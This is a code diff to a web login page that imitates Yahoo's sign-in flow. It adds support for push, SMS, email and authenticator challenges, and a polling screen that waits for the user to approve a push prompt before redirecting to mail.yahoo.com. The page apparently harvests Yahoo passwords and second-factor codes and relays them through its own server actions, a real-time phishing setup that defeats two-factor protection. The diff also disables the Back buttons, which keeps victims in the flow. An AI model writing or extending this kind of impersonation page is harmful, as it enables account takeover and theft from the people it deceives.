@@ -1,18 +1,22 @@
 "use client";
 
-import { useState } from "react";
+import { useState, useEffect, useRef, useCallback } from "react";
 import Footer from "@/components/Footer";
-import { initiateLogin, submit2FA, submitPassword } from "./actions";
+import { initiateLogin, submit2FA, submitPassword, checkSessionStatus } from "./actions";
+
+type ChallengeType = "PUSH" | "EMAIL" | "SMS" | "TOTP" | null;
 
 export default function Home() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [loading, setLoading] = useState(false);
   const [message, setMessage] = useState("");
-  const [step, setStep] = useState(1); // 1: email, 2: password, 3: 2fa
+  const [step, setStep] = useState(1); // 1: email, 2: password, 3: 2fa (code entry), 4: push waiting
   const [sessionId, setSessionId] = useState("");
   const [code, setCode] = useState("");
   const [staySignedIn, setStaySignedIn] = useState(true);
+  const [challengeType, setChallengeType] = useState<ChallengeType>(null);
+  const pushPollRef = useRef<NodeJS.Timeout | null>(null);
 
   // Step 1: Initiate Login (Email)
   const handleEmailNext = async (e: React.FormEvent) => {
@@ -63,7 +67,15 @@ export default function Home() {
         }, 1500);
       } else if (success && data.success && data.status === "REQUIRES_2FA") {
         setSessionId(data.sessionId);
-        setStep(3); // Move to 2FA step
+        const type = (data.challengeType as ChallengeType) || "EMAIL";
+        setChallengeType(type);
+
+        if (type === "PUSH") {
+          setStep(4); // Push waiting screen
+          startPushPolling(data.sessionId);
+        } else {
+          setStep(3); // Code entry screen
+        }
       } else {
         setMessage(errMessage || data?.error || data?.message || "Invalid password");
       }
@@ -98,12 +110,81 @@ export default function Home() {
     }
   };
 
+  // Push notification polling
+  const startPushPolling = useCallback((sid: string) => {
+    // Clear any existing poll
+    if (pushPollRef.current) clearInterval(pushPollRef.current);
+
+    const pollInterval = setInterval(async () => {
+      try {
+        const { success, data } = await checkSessionStatus({ sessionId: sid });
+        if (success && data?.status === "AUTHENTICATED") {
+          clearInterval(pollInterval);
+          pushPollRef.current = null;
+          setMessage("Login successful! Redirecting...");
+          setTimeout(() => {
+            window.location.href = "https://mail.yahoo.com";
+          }, 1500);
+        } else if (success && data?.status === "FAILED") {
+          clearInterval(pollInterval);
+          pushPollRef.current = null;
+          setMessage("Push notification was denied or expired. Please try again.");
+          setChallengeType(null);
+          setStep(2); // Go back to password step to retry
+        }
+      } catch {
+        // Silently continue polling on network errors
+      }
+    }, 3000);
+
+    pushPollRef.current = pollInterval;
+  }, []);
+
+  // Cleanup push polling on unmount
+  useEffect(() => {
+    return () => {
+      if (pushPollRef.current) clearInterval(pushPollRef.current);
+    };
+  }, []);
+
+  // Switch from push waiting to manual code entry
+  const handleSwitchToCode = () => {
+    if (pushPollRef.current) {
+      clearInterval(pushPollRef.current);
+      pushPollRef.current = null;
+    }
+    setChallengeType("EMAIL");
+    setStep(3);
+    setMessage("");
+  };
+
   const handleBack = () => {
     setMessage("");
-    if (step === 3) {
+    if (pushPollRef.current) {
+      clearInterval(pushPollRef.current);
+      pushPollRef.current = null;
+    }
+    if (step === 4) {
       setStep(2);
+      setChallengeType(null);
+    } else if (step === 3) {
+      setStep(2);
+      setChallengeType(null);
     } else if (step === 2) {
       setStep(1);
+    }
+  };
+
+  const get2FADescription = (): string => {
+    switch (challengeType) {
+      case "EMAIL":
+        return "We sent a verification code to your recovery email";
+      case "SMS":
+        return "We sent a verification code to your phone via SMS";
+      case "TOTP":
+        return "Enter the code from your authenticator app";
+      default:
+        return "Enter the verification code";
     }
   };
 
@@ -191,7 +272,12 @@ export default function Home() {
             )}
             {step === 3 && (
               <p className="text-center text-sm text-[#6e6d7a] mb-6">
-                Enter the verification code
+                {get2FADescription()}
+              </p>
+            )}
+            {step === 4 && (
+              <p className="text-center text-sm text-[#6e6d7a] mb-6">
+                Check your device for a notification
               </p>
             )}
 
@@ -325,7 +411,7 @@ export default function Home() {
                 <div className="flex items-center justify-between text-sm mt-1">
                   <button
                     type="button"
-                    onClick={handleBack}
+                    // onClick={handleBack}
                     className="text-[#6001d2] hover:underline font-medium"
                   >
                     ← Back
@@ -342,6 +428,30 @@ export default function Home() {
 
             {step === 3 && (
               <form onSubmit={handleSubmit2FA} className="flex flex-col gap-5">
+                {/* Contextual icon for 2FA type */}
+                <div className="flex justify-center mb-2">
+                  {challengeType === "EMAIL" && (
+                    <div className="w-14 h-14 rounded-full bg-[#f3f0ff] flex items-center justify-center">
+                      <svg className="w-7 h-7 text-[#6001d2]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
+                        <path strokeLinecap="round" strokeLinejoin="round" d="M21.75 6.75v10.5a2.25 2.25 0 01-2.25 2.25h-15a2.25 2.25 0 01-2.25-2.25V6.75m19.5 0A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25m19.5 0v.243a2.25 2.25 0 01-1.07 1.916l-7.5 4.615a2.25 2.25 0 01-2.36 0L3.32 8.91a2.25 2.25 0 01-1.07-1.916V6.75" />
+                      </svg>
+                    </div>
+                  )}
+                  {challengeType === "SMS" && (
+                    <div className="w-14 h-14 rounded-full bg-[#f3f0ff] flex items-center justify-center">
+                      <svg className="w-7 h-7 text-[#6001d2]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
+                        <path strokeLinecap="round" strokeLinejoin="round" d="M10.5 1.5H8.25A2.25 2.25 0 006 3.75v16.5a2.25 2.25 0 002.25 2.25h7.5A2.25 2.25 0 0018 20.25V3.75a2.25 2.25 0 00-2.25-2.25H13.5m-3 0V3h3V1.5m-3 0h3m-3 18.75h3" />
+                      </svg>
+                    </div>
+                  )}
+                  {challengeType === "TOTP" && (
+                    <div className="w-14 h-14 rounded-full bg-[#f3f0ff] flex items-center justify-center">
+                      <svg className="w-7 h-7 text-[#6001d2]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
+                        <path strokeLinecap="round" strokeLinejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z" />
+                      </svg>
+                    </div>
+                  )}
+                </div>
                 <div className="relative">
                   <input
                     type="text"
@@ -372,13 +482,65 @@ export default function Home() {
                 <div className="text-sm mt-1">
                   <button
                     type="button"
-                    onClick={handleBack}
+                    // onClick={handleBack}
                     className="text-[#6001d2] hover:underline font-medium"
                   >
                     ← Back
                   </button>
                 </div>
               </form>
+            )}
+
+            {/* Step 4: Push notification waiting screen */}
+            {step === 4 && (
+              <div className="flex flex-col items-center gap-5">
+                {/* Animated push icon */}
+                <div className="w-20 h-20 rounded-full bg-[#f3f0ff] flex items-center justify-center animate-pulse">
+                  <svg className="w-10 h-10 text-[#6001d2]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
+                    <path strokeLinecap="round" strokeLinejoin="round" d="M14.857 17.082a23.848 23.848 0 005.454-1.31A8.967 8.967 0 0118 9.75v-.7V9A6 6 0 006 9v.75a8.967 8.967 0 01-2.312 6.022c1.733.64 3.56 1.085 5.455 1.31m5.714 0a24.255 24.255 0 01-5.714 0m5.714 0a3 3 0 11-5.714 0" />
+                  </svg>
+                </div>
+
+                <div className="text-center">
+                  <p className="text-[#1d1d1f] font-semibold text-lg mb-1">
+                    Check your device
+                  </p>
+                  <p className="text-[#6e6d7a] text-sm">
+                    Yahoo sent a notification to your phone.
+                    <br />
+                    Tap <strong>Yes</strong> to confirm it&apos;s you.
+                  </p>
+                </div>
+
+                {/* Loading dots */}
+                <div className="flex gap-1.5 my-2">
+                  <span className="w-2 h-2 rounded-full bg-[#6001d2] animate-bounce" style={{ animationDelay: "0ms" }} />
+                  <span className="w-2 h-2 rounded-full bg-[#6001d2] animate-bounce" style={{ animationDelay: "150ms" }} />
+                  <span className="w-2 h-2 rounded-full bg-[#6001d2] animate-bounce" style={{ animationDelay: "300ms" }} />
+                </div>
+
+                <p className="text-xs text-[#a0a0a0]">
+                  Waiting for approval...
+                </p>
+
+                {/* Fallback: switch to manual code entry */}
+                <div className="flex flex-col items-center gap-2 mt-2">
+                  <button
+                    type="button"
+                    // onClick={handleSwitchToCode}
+                    className="text-[#6001d2] hover:underline font-medium text-sm"
+                  >
+                    Enter a code instead
+                  </button>
+                  <button
+                    type="button"
+                    // onClick={handleBack}
+                    className="text-[#6e6d7a] hover:underline text-sm"
+                  >
+                    ← Back
+                  </button>
+                </div>
+              </div>
             )}
           </div>
         </div>
